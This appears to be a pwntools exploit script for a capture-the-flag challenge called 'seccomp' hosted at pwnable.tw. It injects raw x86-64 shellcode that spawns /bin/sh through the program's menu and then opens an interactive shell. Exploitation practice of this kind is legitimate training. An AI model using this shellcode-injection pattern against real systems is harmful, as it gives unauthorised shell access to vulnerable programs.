#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("seccomp")
libc = elf.libc

local = True 
if local:
    p = process("./seccomp")
    #gdb.attach(p,'''''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./seccomp', checksec=False)

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
p.sendlineafter(b">", b"1")
p.sendlineafter(b"shellcode: ", shellcode)

p.sendlineafter(b">", b"2")

'''
p.sendlineafter(b"addr: ", b"a")
print("[+]Addr: Done")
p.sendlineafter(b"value: ", b"a")
print("[+]Value: Done")
'''
p.interactive()